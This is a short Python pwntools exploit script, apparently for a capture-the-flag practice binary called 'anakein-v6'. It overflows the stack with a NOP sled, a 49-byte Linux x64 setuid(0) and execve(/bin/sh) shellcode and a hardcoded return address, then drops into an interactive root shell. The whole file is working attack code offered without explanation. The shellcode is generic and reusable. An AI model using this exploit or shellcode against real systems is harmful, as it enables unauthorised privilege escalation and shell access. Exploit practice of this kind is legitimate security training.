#!/usr/bin/env python
# written by @Anakein - <anakein[alt+64]protonmail.ch>

#greet: @zc00l

from pwn import *

e = ELF("./anakein-v6")
p = process(e.path)

#Stack Overflow information
offset = 120 #bytes
#Linux/x64 - setuid(0) + execve(/bin/sh) Shellcode (49 bytes)         | shellcodes/linux_x86-64/13320.c
shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
shellcode_len = len(shellcode)
ret = p32(0x4006a3)
payload = "\x90" * (offset - shellcode_len) + shellcode + ret + "A" * 2000

#Send the custom exploit and start mode interactive
p.send(payload)
p.interactive()
